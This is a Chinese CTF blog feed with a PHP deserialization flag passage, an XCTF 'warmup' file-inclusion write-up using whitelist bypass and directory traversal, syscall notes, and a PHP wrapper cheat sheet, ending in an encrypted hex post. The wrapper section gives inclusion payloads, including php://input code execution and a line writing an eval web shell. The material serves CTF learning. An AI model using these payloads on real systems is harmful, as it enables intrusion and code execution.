但是我们需要将其进行base64编码，这里就需要注意一个常见的坑，就是private属性的名字填写，两边要有两个\x00，这个时候我们不能直接将其进行base64编码，所以我们要将其用十六进制形式打开，改掉里面的内容，或者用下面的脚本进行修改：12345678910111213# -*- coding: utf-8 -*-import base64s = ""with open("2.txt","r+") as f: for line in f: line = line.strip("\n") for i in range(0,len(line)): s += line[i] if i &lt; len(line) - 2: if (line[i+1] == "D" and line[i-2] == "0") or (line[i] == "o" and line[i+1] == "f"): s += chr(int("0x00",16)) print("1") print(base64.b64encode(bytes(s,encoding="gbk"))) 得到如下flag： 123&lt;?php$flag="ctf&#123;b17bd4c7-34c9-4526-8fa8-a0794a197013&#125;";?&gt; 0x02 文件包含问题基础知识参考链接 PHP文件包含漏洞的产生原因是在通过PHP的函数引入文件时，由于传入的文件名没有经过合理的校验，从而操作了预想之外的文件，就可能导致意外的文件泄露甚至恶意的代码注入。注意：如果被包含的文件中无有效的php代码，则会直接把文件内容输出。 如果允许客户端用户输入控制动态包含在服务器端的文件，会导致恶意代码的执行及敏感信息泄露，主要包括本地文件包含和远程文件包含两种形式。常见包含函数有：include()、require()，这两者的区别有： include 是当代码执行到它的时候才加载文件，发生错误的时候只是给一个警告，然后继续往下执行 require 是只要程序一执行就会立即调用文件，发生错误的时候会输出错误信息，并且终止脚本的运行 require一般是用于文件头包含类文件、数据库等等文件，include一般是用于包含html模版文件include_once()、require_once()与(include\require)的功能相同，只是区别于当重复调用的时候，它只会调用一次 【XCTF-web】warmup1.题目描述 从上图可以看出，题目给出的网址打开之后只出现一个大大的笑脸，F12打开源码看见被注释掉了一段“source.php”，我们下面打开该网址，得到如下PHP源码： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849&lt;?php highlight_file(__FILE__); class emmm &#123; public static function checkFile(&amp;$page) &#123; $whitelist = ["source"=&gt;"source.php","hint"=&gt;"hint.php"]; if (! isset($page) || !is_string($page)) &#123; echo "you can't see it"; return false; &#125; if (in_array($page, $whitelist)) &#123; return true; &#125; $_page = mb_substr( $page, 0, mb_strpos($page . '?', '?') ); if (in_array($_page, $whitelist)) &#123; return true; &#125; $_page = urldecode($page); $_page = mb_substr( $_page, 0, mb_strpos($_page . '?', '?') ); if (in_array($_page, $whitelist)) &#123; return true; &#125; echo "you can't see it"; return false; &#125; &#125; if (! empty($_REQUEST['file']) &amp;&amp; is_string($_REQUEST['file']) &amp;&amp; emmm::checkFile($_REQUEST['file']) ) &#123; include $_REQUEST['file']; exit; &#125; else &#123; echo "&lt;br&gt;&lt;img src=\"https://i.loli.net/2018/11/01/5bdb0d93dc794.jpg\" /&gt;"; &#125; ?&gt; 2.题目分析我们从上文源码中可以看到，还有一个hint.php文件，我们打开一下看看里面有什么提示信息，如下： 1flag not here, and flag in ffffllllaaaagggg 从上文可以看出我们要的flag在ffffllllaaaagggg文件中，那么我们可能需要遍历目录查找该文件。 下面我们分析上面的PHP源码： 1if (! empty($_REQUEST['file']) &amp;&amp; is_string($_REQUEST['file']) &amp;&amp; emmm::checkFile($_REQUEST['file'])) 如果同时满足上述三个条件，即可执行文件包含漏洞，这三个条件分别是： 输入的字符串要为非空（因为如果输入的字符串是非空，empty返回False，那么!empty是True） is_string()：要求输入的是字符串是字符串 要满足checkFile函数返回的是True 下面我们就分析一下checkFile，我们要使得他的返回值为True 12345$whitelist = ["source"=&gt;"source.php","hint"=&gt;"hint.php"];if (! isset($page) || !is_string($page)) &#123; echo "you can't see it"; return false;&#125; 要求我们的输入为非空字符串 123if (in_array($page, $whitelist)) &#123; return true;&#125; 要求我们输入的字符串要为source.php或者hint.php，否则不执行。这里是第一个返回True的地方，我们先记为 ① 12345678$_page = mb_substr( $page, 0, mb_strpos($page . '?', '?'));if (in_array($_page, $whitelist)) &#123; return true;&#125; 首先会执行mb_strpos($page . &#39;?&#39;, &#39;?&#39;)，该函数会返回输入字符串之后加上?之后的首次出现?的位置，mb_substr函数会返回我们输入字符串从0到首次出现?之前的字符串，如果该字符串有”source.php”或者”index.php”则返回true，这里我们记为② 123456789$_page = urldecode($page);$_page = mb_substr( $_page, 0, mb_strpos($_page . '?', '?'));if (in_array($_page, $whitelist)) &#123; return true;&#125; 会对我们输入的payload进行url解码，然后执行同上的操作，然后返回true，这里我们记为③ 3.构造payload根据第2部分的分析，要想能够输入我们的payload，我们可以使得checkFile函数返回true的地方只有②和③ ② 处的payload为： 1?file=source.php?(payload) 或者为 ?file=source.php%3F(payload) ③ 处的payload为： 1?file=source.php%253F(payload) 下面就是如何确定在哪个目录下，这就需要我们一个一个进行尝试了，在尝试之后发现ffffllllaaaagggg在/../../../../ffffllllaaaagggg中，所以payload为 123?file=source.php?/../../../../ffffllllaaaagggg?file=source.php%3F/../../../../ffffllllaaaagggg?file=source.php%253F/../../../../ffffllllaaaagggg 4.目录遍历问题经过测试发现并确定，这种包含的前提是包含的文件必须是当前文件夹不存在的文件，只有这样才会将该文件解析成目录，从而遍历其他文件；此处hint.php?被解析认为是一个目录，但该目录并不存在，因此第一次../仅仅又是回到当前source.php的目录下。 目录遍历 解析 ../ /var/www/html ../../ /var/www ../../../ /var ../../../../ / 此外，在Windows下hint.php?无法被解析为目录，在linux下成功认为是目录，原因为Windows系统文件命名不支持问号。]]></content>
      <tags>
        <tag>web</tag>
        <tag>PHP</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[CTF中常见的函数总结]]></title>
    <url>%2F2020%2F07%2F27%2F2020.07.27%EF%BC%88141%EF%BC%89%2F</url>
    <content type="text"><![CDATA[0x00 pwn题 1.open()函数 函数原型 int open(const char *path, int flags,int mode)； flags 常量名称 数字 作用 O_RDONLY 0 只读模式 O_WRONLY 1 只写模式 O_RDWR 2 可读可写 函数功能 以各种方式打开文件 函数返回值 如果调用成功，它将返回一个可以被read和write等其他系统调用使用的文件描述符。这个文件描述符是唯一的。它不会与任何其他运行中的进程共享，除非是fork了子进程。如果两个进程同时打开一个文件，他们会分别得到两个不同的文件描述符。如果他们都对文件进行写操作，那么他们会各写各的，它们分别接着自己上次离开的位置继续往下写，数据不会交织在一起，而是会彼此覆盖。我们可以使用文件锁功能来防止这种事件。’ 返回的文件描述符 fd的值一般是3开始，依次增加。比如我open了两个文件，那么它们的fd分别为3和4。 系统调用号 2 open sys_open fs/open.c 2.read()函数 头文件 #include&lt;unistd.h&gt; 函数原型 ssize_t read(int fd, void *buf, size_t count); 函数功能 读取文件内容：read()会把参数fd所指的文件传送 count个字节到buf 指针所指的内存中。 函数返回值 参数count 为0，则read()不会有作用并返回0。返回值为实际读取到的字节数, 如果返回0，表示已到达文件尾或是无可读取的数据，此外文件读写位置会随读取到的字节移动： 当文件的整体字节比count小时，读到文件尾、从管道(pipe)或终端机读取、我们读取时被一个信号打断了等等情况。 当有错误发生时则返回-1, 错误代码存入errno 中, 而文件读写位置则无法预期。 测试用例 12345678910111213141516#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;string.h&gt;#include &lt;errno.h&gt;#include &lt;fcntl.h&gt;int main(int argc,char *argv[])&#123; int res=0; char buffer[64] =""; int fp = open("./test.txt", O_RDONLY);//只读模式打开文件 res = read(fp,buffer,60); printf("read %d bits,they are %s\n",res,buffer); printf("%s\n",strerror(errno)); close(fp); return 0;&#125; 系统调用号 0 read sys_read fs/read_write.c 3.write()函数 头文件 #include&lt;unistd.h&gt; 函数原型 ssize_t write(int fd,const void *buf, size_t count);· fd：是文件描述符（write所对应的是写，即就是1，这是标准输出） buf：通常是一个字符串，需要写入的字符串 count：是每次写入的字节数 函数功能 打印文件内容 函数返回值 成功：返回读出的字节数 失败：返回-1，并设置errno，如果在调用 read 之前到达文件末尾，则这次read返回 0 系统调用号 1 write sys_write fs/read_write.c]]></content>
      <tags>
        <tag>基础知识</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[PHP伪协议总结]]></title>
    <url>%2F2020%2F07%2F25%2F2020.07.25%EF%BC%88140%EF%BC%89%2F</url>
    <content type="text"><![CDATA[0x00 file://协议 条件： allow_url_fopen:off/on allow_url_include :off/on 作用： 用于访问本地文件系统，在CTF中通常用来读取本地文件的且不受allow_url_fopen与allow_url_include的影响。 include()/require()/include_once()/require_once()参数可控的情况下，如导入为非.php文件，则仍按照php语法进行解析，这是include()函数所决定的。 说明： file:// 文件系统是 PHP 使用的默认封装协议，展现了本地文件系统。当指定了一个相对路径（不以/、、\或 Windows 盘符开头的路径）提供的路径将基于当前的工作目录。在很多情况下是脚本所在的目录，除非被修改了。使用 CLI 的时候，目录默认是脚本被调用时所在的目录。在某些函数里，例如 fopen() 和 file_get_contents()，include_path会可选地搜索，也作为相对的路径。 用法： 1234567/path/to/file.extrelative/path/to/file.extfileInCwd.extC:/path/to/winfile.extC:\path\to\winfile.ext\\smbserver\share\path\to\winfile.extfile:///path/to/file.ext 示例： 1. file://[文件的绝对路径和文件名] 1http://127.0.0.1/include.php?file=file://E:\phpStudy\PHPTutorial\WWW\phpinfo.txt 2. [文件的绝对路径和文件名] 1http://127.0.0.1/include.php?file=./phpinfo.txt 3. [http://网络路径和文件名] 1http://127.0.0.1/include.php?file=http://127.0.0.1/phpinfo.txt 参考：http://php.net/manual/zh/wrappers.file.php 0x01 php://协议 条件： allow_url_fopen:off/on allow_url_include :仅php://input php://stdin php://memory php://temp需要on 作用： php:// 访问各个输入/输出流（I/O streams），在CTF中经常使用的是php://filter和php://input，php://filter用于读取源码，php://input用于执行php代码。 说明： PHP 提供了一些杂项输入/输出（IO）流，允许访问 PHP 的输入输出流、标准输入输出和错误描述符， 内存中、磁盘备份的临时文件流以及可以操作其他读取写入文件资源的过滤器。 协议 作用 php://input 可以访问请求的原始数据的只读流，在POST请求中访问POST的data部分，在enctype=&quot;multipart/form-data&quot; 的时候php://input是无效的。 php://output 只写的数据流，允许以 print 和 echo 一样的方式写入到输出缓冲区。 php://fd (&gt;=5.3.6)允许直接访问指定的文件描述符。例如 php://fd/3 引用了文件描述符 3。 php://memory php://temp (&gt;=5.1.0)一个类似文件包装器的数据流，允许读写临时数据。两者的唯一区别是 php://memory 总是把数据储存在内存中，而 php://temp 会在内存量达到预定义的限制后（默认是 2MB）存入临时文件中。临时文件位置的决定和 sys_get_temp_dir() 的方式一致。 php://filter (&gt;=5.0.0)一种元封装器，设计用于数据流打开时的筛选过滤应用。对于一体式（all-in-one）的文件函数非常有用，类似 readfile()、file() 和 file_get_contents()，在数据流内容读取之前没有机会应用其他过滤器。 php://filter参数详解 该协议的参数会在该协议路径上进行传递，多个参数都可以在一个路径上传递。具体参考如下： php://filter 参数 描述 resource=&lt;要过滤的数据流&gt; 必须项。它指定了你要筛选过滤的数据流。 read=&lt;读链的过滤器&gt; 可选项。可以设定一个或多个过滤器名称，以管道符（|）分隔。 write=&lt;写链的过滤器&gt; 可选项。可以设定一个或多个过滤器名称，以管道符（|）分隔。 &lt;; 两个链的过滤器&gt; 任何没有以 read= 或 write= 作前缀的筛选器列表会视情况应用于读或写链 可用的过滤器列表（4类） 此处列举主要的过滤器类型，详细内容请参考：https://www.php.net/manual/zh/filters.php 字符串过滤器 字符串过滤器 作用 string.rot13 等同于str_rot13()，rot13变换 string.toupper 等同于strtoupper()，转大写字母 string.tolower 等同于strtolower()，转小写字母 string.strip_tags 等同于strip_tags()，去除html、PHP语言标签 转换过滤器 转换过滤器 作用 convert.base64-encode &amp; convert.base64-decode 等同于base64_encode()和base64_decode()，base64编码解码 convert.quoted-printable-encode &amp; convert.quoted-printable-decode quoted-printable 字符串与 8-bit 字符串编码解码 压缩过滤器 压缩过滤器 作用 zlib.deflate &amp; zlib.inflate 在本地文件系统中创建 gzip 兼容文件的方法，但不产生命令行工具如 gzip的头和尾信息。只是压缩和解压数据流中的有效载荷部分。 bzip2.compress &amp; bzip2.decompress 同上，在本地文件系统中创建 bz2 兼容文件的方法。 加密过滤器 加密过滤器 作用 mcrypt.* libmcrypt 对称加密算法 mdecrypt.* libmcrypt 对称解密算法 示例： 1. php://filter/read=convert.base64-encode/resource=[文件名]读取文件源码（针对php文件需要base64编码） 1http://127.0.0.1/include.php?file=php://filter/read=convert.base64-encode/resource=phpinfo.php 2.php://input + [POST DATA]执行php代码 123http://127.0.0.1/include.php?file=php://input[POST DATA部分]&lt;?php phpinfo(); ?&gt; 若有写入权限，写入一句话木马 123http://127.0.0.1/include.php?file=php://input[POST DATA部分]&lt;?php fputs(fopen(&apos;1juhua.php&apos;,&apos;w&apos;),&apos;&lt;?php @eval($_GET[cmd]); ?&gt;&apos;); ?&gt; -参考：https://php.net/manual/zh/wrappers.php.php 0x02 zip:// &amp; bzip2:// &amp; zlib:// 协议 条件： allow_url_fopen:off/on allow_url_include :off/on 作用：zip:// &amp; bzip2:// &amp; zlib:// 均属于压缩流，可以访问压缩文件中的子文件，更重要的是不需要指定后缀名，可修改为任意后缀：jpg png gif xxx 等等。 示例： 1.zip://[压缩文件绝对路径]%23[压缩文件内的子文件名]`（#编码为%23） 压缩 phpinfo.txt 为 phpinfo.zip ，压缩包重命名为 phpinfo.jpg ，并上传 1http://127.0.0.1/include.php?file=zip://E:\phpStudy\PHPTutorial\WWW\phpinfo.jpg%23phpinfo.txt 1compress.bzip2://file.bz2 2.压缩 phpinfo.txt 为 phpinfo.bz2 并上传（同样支持任意后缀名） 1http://127.0.0.1/include.php?file=compress.bzip2://E:\phpStudy\PHPTutorial\WWW\phpinfo.bz2 3.compress.zlib://file.gz 压缩 phpinfo.txt 为 phpinfo.gz 并上传（同样支持任意后缀名） 1http://127.0.0.1/include.php?file=compress.zlib://E:\phpStudy\PHPTutorial\WWW\phpinfo.gz 参考：http://php.net/manual/zh/wrappers.compression.php 0x03 data:// 协议 条件： allow_url_fopen:on allow_url_include :on 作用：自PHP&gt;=5.2.0起，可以使用data://数据流封装器，以传递相应格式的数据。通常可以用来执行PHP代码。 用法： 12data://text/plain,data://text/plain;base64, 示例： 1.data://text/plain,` 1http://127.0.0.1/include.php?file=data://text/plain,&lt;?php%20phpinfo();?&gt; 2.data://text/plain;base64, 1http://127.0.0.1/include.php?file=data://text/plain;base64,PD9waHAgcGhwaW5mbygpOz8%2b 0x04 http:// &amp; https://协议 条件： allow_url_fopen:on allow_url_include :on 作用：常规 URL 形式，允许通过 HTTP 1.0 的 GET方法，以只读访问文件或资源。CTF中通常用于远程包含。 用法： 123456http://example.comhttp://example.com/file.php?var1=val1&amp;var2=val2http://user:password@example.comhttps://example.comhttps://example.com/file.php?var1=val1&amp;var2=val2https://user:password@example.com 示例： 1http://127.0.0.1/include.php?file=http://127.0.0.1/phpinfo.txt 0x05 phar:// 协议 phar://协议与zip://类似，同样可以访问zip格式压缩包内容，在这里只给出一个示例： 1http://127.0.0.1/include.php?file=phar://E:/phpStudy/PHPTutorial/WWW/phpinfo.zip/phpinfo.txt 另外在 Black Hat 2018 大会上，研究人员公布了一款针对PHP应用程序的全新攻击技术：phar://协议对象注入技术。 因为该利用点需要满足一定的条件才能利用，可以参考下面这篇文章，里面的demo也非常详细，留作以后专门研究一下。 参考文章：seebug - 利用 phar 拓展 php 反序列化漏洞攻击面 0x06 参考文章 文件包含漏洞原理分析]]></content>
      <tags>
        <tag>基础知识</tag>
        <tag>PHP</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[CTF-web 类型题目总结]]></title>
    <url>%2F2020%2F07%2F24%2F2020.07.24%EF%BC%88139%EF%BC%89%2F</url>
    <content type="text"><![CDATA[Hey, password is required here. 85622e100507fc49db72026265d5d53bba5b2917323392df3e25f34662e8ec7b810c8d44d76d40e16fbdbd3bceafce506ee0f71bb2bbfdd1eaf450ee0a105c6deea4c486e92e0c4bac943e67823a234b9114b182c464fdd47323f84306375f42daed9b2e52003f78f4d2b970db66844e544c36dce4bcf0d2a388323b857a2371265c6129844bee07e33bcefbe1ff53f7f33fb21367df64cca786878fda574703b61e845f6dfad91888afd636f94228407963269ebcd8e1b59a8fb5247718fb9e1b8bdbfafaa2e43a7ee57b6e2276f5a4fd88dcea6162b990583ef510c557ff342f876ada61e80d9832ae7dbd92b87be5830e5f3c0f20d92725465b5e2cddefbfb7921b2b81abd24c28f651e0b6c6ce4487270eba8570a56f6e97c3c92d099239d24c0d6748d6004ccb97aed007f93dee4ec2660f7213aafae8e6d5ed54867d4e49ee74515e4afb57ed26c6076657b7dfb6dbe2e6861a2f275fe81a050439b62b974e4baa91cb6e29641e026d2ffa4ae7571943fc81f97639bb54da093cd96d23ddbc1f6e5ab74b7c5979c0f35b4645992942b104c85cb6315fe63f53bb74f793a61c0a44ffdce2297fc28df4c7e1602438090197c2f23bbae0303d631b6e24a20549a914550f3d6a7a25dea7f728e9be5eb2bcf18b66b8e95907300f3da95d667158015ef41a7513d50167542df9866ad39040bb15638feffac200a834ccc12bf414d616f8555b11307807736d54ea12b6f664462134c6ef421070f202b1dfeab1e17584b2400a842a1374f3fe6ee5fd939e0d2e33113f0a000d5bd6eb8effb49eb8951e121d08fa9cd9f2662943de2c5ddab490e5659b76d0e318a7948c37aa0c431b425a2744ed248e1a7980836d50a365fce8197b152527be0927d2c0216ef87a9500eac3ae3d1b82ca802b306441b6d89d60c199f806ef6d80d5498887bab08ba1a07a8e6e1ef66f459aee708b365d92a8c5b4dd0c0529cc760aee9dad643ab37782c0b6c32d72bf17f300442b1b3a6a292cff70711944a361b6bb9c0e7230ea58f6ae8788604ba82613a31b655a3c3fa10289840869939bade625e6b2fdad0cc3a4feaa683b66159697ac9044ea4166cdc45e4f7e329fae3c29276aaf728587c67ce1dd33be0b5465c28a00223a987b9f821c0729080f1b353b90c0b6b4c81cd4be5ed5c34b92550d5cfe852ae5d56577d095383a4aca3c8a25eeb79b2347bf0d7ac2137875de68f2a993f4db61b4116acb49d980b220f64b215bd11772e0e9977d7d90442a13cf7a035abda4550e6468a303627fc91ef209941f39603b069ff17664f4192ebfddbd8a98dcc08b6f88f132359d52519455c72cd1e7cbce04e9ebad693a0128b20a0d9cef3dd326921a7a2bc486a3b9464967c5ebcf358cd4d73e1848baa96fd2db1ae52d1c25cb6aefa4e7d6aac591097fefe57d80b7f52013053bc74ff16b9085a4c8d6bc296cbef67c053126d7309506e9858e4dd6b765db9ae6f07b145a3a1a62ee7eae28903f91309c5a05c3bb8605664e51823f72ccc5e151885c1a672b0fdc381a2d00fbd770b40950d3792be8e5241088598fcecdc555685e434eaa0ca35b25cebc8def30f64d698fe1db7dc569b9aadb3ae0be684efec7d48787c718360bea169a5254a03fca9ecd1c6eb58b3c4955f1b6c3857b8ec053de5e70385d79717e020893df47b707d3c1a70836ee0ad4a169da3b10a5439f355fa94da3a20106b8b6f68d0de47bf0b831536e60305a1e25915524bc4cae86e88222f5dd643132c9cf844d8e56b0f125f9a1d0e8f34a36dcd187b642b835311021fc011adff0f675de3cb6df7ff97c74885d7a4d799665e9c0c20dbf4788d1c0a85ae8d9fed7163975d73a8b001daa6437fe7390cb920e9f27383da666e1a62e4df1a07297d91e38e00d8bc48ee1bf36629c962d9f5af00454caccdb35a5294ff588d6f7e8112a240909b833554f62f1d5beb061af4c72378c1c83085bb2ba56f6c6998341e57cb11fb58206ec94ec4e66a66482be1860d627a2939d3cc85c169a25db004af8978e62c1700a15bdd064dbcaa5ddae769424bb61934bd19d296094873198c434fef1bb31eeeae10b548e768980fb66d2b19d93a1f3cf7058129fe80841683c0e1ff55166b4528d3ef559cf1527137eadc8820b4cf8780f04ca6b3a504e2facbf6b7bedd15b315fe54aff56bad28bda7450a2ff8b7a4bb9f55b2868eb5ba91c87f5526329a4083dd5ac151cdf17c4a8e647f06a35a7fb9c8aa97f2d8ad80e7b1a13e52359e6137546cc7e29ad50de7927e6f787938ad9f718831fd0238c53f0c93da68d05b688adcca5456a39c46448997615e0751aac6e0dab794a06bc08e6d5ecaa39635f4b2199217c9b7f4ce6bd7e1792b7462672e8449c6ccf7c4a49b46fba3826c4af66a9afb6cc93bf989fb47ee4897c11305db83c5cc4b1a0d2dca24ef1706ca21c3301b7962d6db484ae0942e7797605999a4ba87654a02f52142c05568fd6b9bd7108622dccd7bb527504970abd2fcfe16fbfc10dee037f94c3d5a9ad2d78b55774b2b37b2a9d3308ce8f5911e2b1ca2de3d453ca346afc53e9d053fd3cd49ff88d6026877aadd8acf349b0a648533958e7a8b4519662fe2cd0aca2a4bfe9afa2a47d2b20cb38798a5e136c7bef7a2567f32acabe43c3151169db63debbdde957009a91189a91f04a353384ade5ffd4591b347be2b9aed4a55a2baa2a2469ad9d1227d37071a5b0929d170672b7d2b0a33d81a1d69eca47f9bf1b60634cecd8bae555a0e307f0c0fa3fe248299a4d7348a1c0cb0ab438371d99d7f25252e7fe864583321f101b108b798271b82c0f211fd38615d6ee0bb200ae7a90aab6969b958be75773e1f128329d5309815deb5b46bf8d8323c47a026cbe7f6f4b580f6a0ce10ae14d89d353f0b5eb89deffa46a0ed6ba6ccee7a9f823d18211851a64515a18b11a97d1406a5cbd8950f0bf2794c13ec5397e8b09ebd758a10360cbaa1d68b589adbc753b6800b2f40c645de3c38286b9db343af40cbcb57cecc0574dad92225e92bd23311ff7e61bd53dce75f4cd4850b0f7c8a91f22f446ae7f83d1a51c2dcdb059093c6011516f8039d550b8a4ac107ebcb94150f01345d7f63fa58e3fd92d8efa4d517e299e55d8971bc1f10673fac715fbbc871d393a3eb3ea2fdb91bfcf05589e17be627e6bafef31172131e7d13296dc1e794be590df0df5db098605f24bff313f7cb0d95220983cf111d665bad569309ccee686e9dcfe8e1706e4f30e6703762017689dd65661a1f19cab32159a8605a4fa6f0dd1f4b6cd3c5581411511e3aadadde42044e3e854b3885d64379ce393d780518a9e0d8469c209c07c07d01466193c6363214e997de4764e2fbb665f7a57406e0535752a84f4e15db8a968ef0a71f6c138cdc09c36ab4881cc91c2f505b676d02ba3cbf7604ff8476ab7364994546739717e85d92472b39402eac9106853eef9f12a72b921764632a874b5a3091a8c014a491116910ab652a3608d288beffd52e1649a285fbe8d91f086e7d8263dc18d8905cc04997dab8a2707b85073e6703943deae7f89d6b619288b6c6b76c3636295ea876b3301b9738ed2c4d882dcf99ccd42699f11e5cd6e0938d34499fc06778fdb13b86d238ed609cdf86a7772bd71c7126c1c0e76bdcc2d672fb4e8cadb4a8d7e036044b150f2bca29b3543734c6e3824ce0461c453cdbccfd8e96c857b53ac997fb86d72361827fb96d964ef8b0c0d3ed88b8927c54bde4c9de570a0aebcb1c9771a04c57a3510102d5fe27a58b4d0c57b3b25a71e424011a0f9bd37d2fda04f828540eb8feef1b9c98b01d1d1a9b69e483d1fc64163860db50f14ef87c0b59399eafc473e819f8ccb41a86c39f42f0f308f4e137b17a7cd49850b0bd1a53383a3a9af0c51567539e03641f337fffea6fe2c0d463215ffe2f767f9b50f6e75debd8df7936b4c21add28fb80065211fba07cf10bdd0b361d638b9b7f715428aa6f1ef3685dbb1cd01953dbacd54cb3fb5de7d22e60bd699e75866a00d70d61fb2811d1a6efd18ab175f2781abd0ab771d7e898a36bc79fad964bb4213946497be94f5cc4c8c854c2c4104390f3305eb222b828fdab3d0717daa65e7cbdb07831b70a080419a61a8c3271ff026be765e133c78f50bde9ee17875c7dca07e7a7fec687940ca1fd7f65d421f22a052ec02b57af4856fe800d6ab9818843506fe69eeaaf793fe15ab22ecb8dd9976c5988c7dcd4c05005800506e83359ced236683291d9d2307a0cef14cb3c1c9a103d07cd96bba83751992ff87e509616e54e85169aeeebf245ddb00ab5103e8587e3ca0f3bb2a7a6f447faa84f33209d7c9b0a491f3e25a88888085e9ef976811ac3a7ddd3d4440f801c87e3127df86659f621e159d84222bafbcae9245f66c2198a665a61fd9242556b01637db45df109337f8f15f531065a2ba52537cfbd39a44f7f222b05812bc5e607d22241d89e033cd73a0ed742de991c726686c996e6fc3728921bb42989748292cb81bd9a8b71c26165d1f1d4e5ac881f504b583a3e83f2e904489edecd811114968f87e904195508a3c52c00f8f3fd1834dc1636fa7f3322a90eeff9789f2068ac053a350eeb91f98f4a2d45c7b8be90728030c7028a3796d1367d5a369475948c9372bbba8a0c47019a51aa7dd3911d7aafc30244b975444d9813f6aaa47bafd20ba550cd7cc487afdedc8a6c00279c73d9ac62437b553bc71073f16e4507cd7e05282321c8fe47a5b48d514f82a90f4945cf448e6e31279522b0522e2905c707e67d130ceb820057e9c8878fd6f735c3e04624aa13e85ecfd93523616ad0c6975635403769ff0ccdd1f22cdf3eb90bf0e2ad501152b959375350d8ef1581b49f7a2cea5088e6cbf4918daccb5f3eba403bbaa46c0fb8dec86adf272dc817d0adabbf1bf815602fba12b2cde65b0f149212e6fddd42b1ffaa4719e312e2ed0324fa7759dc76957fae9e7bcf8c5336dcfe7f7aac5d084695662b32ecad9ccdcc26eeb808a53401ba21d7bc649dd8b0afd1bde06fa229519989b053696d597ecb539c872c161b5ca8cf7053d7664789541412b1de7bed2220f403ea17dda51da63bd70b5cd8bc37dab912f6ca7b356119582e45605db5cd5c09d070a55cb3bdd387ba3fc414c9212583f866ef17988ee994ba45a28f6e20360c437e6d79a80538130bcbc3cb08dea8c1baf31f85e233417e73c4437191ea487ff3579e51c2e7a483f553f31d54d3b2da88a326d419ae910b7981b753a861ad353e03c392d27170708a14f2e3943edf7848612ecbf4129a04bfe864160c3e8579d25061d436ab18ba26cdd5ea522700b514924697c298721f086b60b6d2aac29a07f7f2a30f094ccf83fc2d3a61716873e25d60c1789307950adf741aaa1a47c3f6972c2bd4f1d2c8eabccb8bb7102c092760eebc5009ea585985202f20ed54837832e2fb277c751cb232b1638a93214ec174136997af8e8c149fd7cb169656b80ea94c91466d6371d01f4e5455e372961d0f69ce99364595420a0881e0fc230ad42726a2c02ba85a3bc0fcbbbc8b3d46516a9957e1af5affb1e9a27a8e138c3c58360d2aab6ca53e317f3bfc154c15dbd523849f0689d97f0c44f42cb9eb4644c5feaf56e57256ec0c9c7a8f274815dcb3d9858f620e2067072e5b329463fcdee9ddc2164f8e41fe075e0faeaae931896122b128b3d765e25344bec7fbfb7674f46fdba932a6654c477769e37b6c72978ca8a99ee49f5dfb3bb83e008e26b5f7ae319429baac6564516f62305cc72d2bf35ac6b891bd80433eb6125e24e7a2678bd76bcd929818e7c047b182b70eb173d1a12eafa63c0ef1a680d4d6135324372bb5a0e7f8443edd888462d071467c42581fa5686d1925121f2b618091f6ca9d2084d1b69ae12c1631747106599f6c333bbf13fa8fdbda8d02eec055d5aba8048acc7c5ea77a2ddded4e0456360785d71791cd1a4228db3bd2bc58bfe4678799763c85a8467a6f4891c81c3e39c3eed01acbc68397bb621384b9137ac05be419dba11a085fb5a1b8487a98108db1ab8996fbbbb7007dfbed687e4af8b61f6e8fa0b7630ec7ff5e0c180ee432518e1b753994f8e0500eaa0cc2bf4ee978acafbb36a69d41e7d57d2026e110c097ebbc9c9738211d24fd20274cb599da9fd75e3c521ef78b7715e06ab74ff4ad1449cf1879d20ec3b4e066238c60e29f193078908ebf6e5b34b1654ed924b7f2551af48b294c0a4e5a331b43f08cbc63ce1ad3a61cc14134d7f49ef61c14b73a5d3a24cb3e0eaeb8ad2455e4ad244bdadc389327dba6862e8374b3d638153e8b9e72bf405b4deabab6852a75d45fbcae60af8bd6338fc7f46a667d30deaaba52605b181c57044520fbb57eb341c2072b6cb8b4089ddb15a6201472763f3ff378f284445ca45eb753a0755b8db80e5ef37453c2a58c1a9dda8bab757756746af1aef06d63fa02b0a133697f53dbaeb768edac1d4dd6625ce51ab0a9b6c163aa7cb1f2cc1b6ad62161fe34eae0792e07c864754cc98680297001a7947d58af6312aae965593a63a8f87ba2d58a1e3d557bbdccbd185b0512050483007b2b63319aeeab0118b88aa934dbf8f450ae4036d5fba9ce645f0d88a3d041902d9aa5a3033071e8a924d2cb0eff4f75ef87b1b6009d3bef529859c946af58c591708844484ea268ce514903d6b1e6c36622fb23c85e4cc08bce4b09c657a879f3024de975421dfa9f273a7690a8540bd0f2698d9a90b88aaad298ea920fbd24ec5691bc390084f4dc475e7ffbe20f1759b11241a88a6c7f0518d960c726114343b5dc190e450772afa588d84fe521b2b79d7187fcbcb6a4e24a0724e0971279f42cd5e27fa6b4593bb9cd04457e88c115f1eecdd63882f4bc46d9c763d0007fbfc890804409abfd2aadd43604618d513953af0ff906fadd47259f9e7b7bf659d7d12591084660199dd579ec3df6a110205e5cd791c5cde404c15f6a4e4000a4c9e4967f2ed2446cd228ba4835af37c23e24fa223b0f0f83fd20921a81ab3acc3f0116ba74dd2b02cc2742238788e0657bf4dae957b8821d084bcbf2ca26f57982f3cc30c28b28546c5c119bdfaa3de064ee80454ddb153a528adbeafa3b8512ecd30729187443c2db8171f8c7c394341d896378cdd8f4614c0f596348ed067166184192260c6556919e2760a9cef66de7e9e25f6ccc758ccef21d1e70bf9d6063c0fb3e8bae131cece04321aa66179975936f355174c0d00ad4fd9d78fe4ff08fa85d1d3ae839e95d916a99e8f99123e717a2f6efb671c078710f6a10eeb1d39bf78e13a30723b9cbc6c78d4f2dbc5e1d689c0bec57e2b812c205497e9801dbc884b1de1e9a96716ac1deed08b17e87f2f9990cd85d937045520882095ec2ac37baa629236708b970cf417101a7532ebe3786363409e7792dac6b033d4f81e33747c13162a23068c681bfce078d4195879597460d96dda948c089d5a11e4d2527bda37d5b945cf57c2b6468b28af2504ef7422f12470fb74b74454e5c66b0b07a91b44175660105c93c0df05a896f95863f9f3d92bdb5d9ea571890a6a1b360d7a223086e33f21c0c75738ea2b29a28d4171ce9465ec165844d93a667600e0b24c485ec8d8345ef4880abd4d0bc39e1c6e66a1d1a46d7f7db7b6bf9e2198bfd8756b6f17d6ae3eef0ef57b260369e12f5623a69ed2bacf1706a09f3dfaf1e7e7ffe752d9c2f1547337476b6881a53401a89a177d5352d5873527df0f499939454fc38771d042c22bae1b8b0da60112145538ea6a7ca5f8c6c12b1c07cca5d4751f9d28202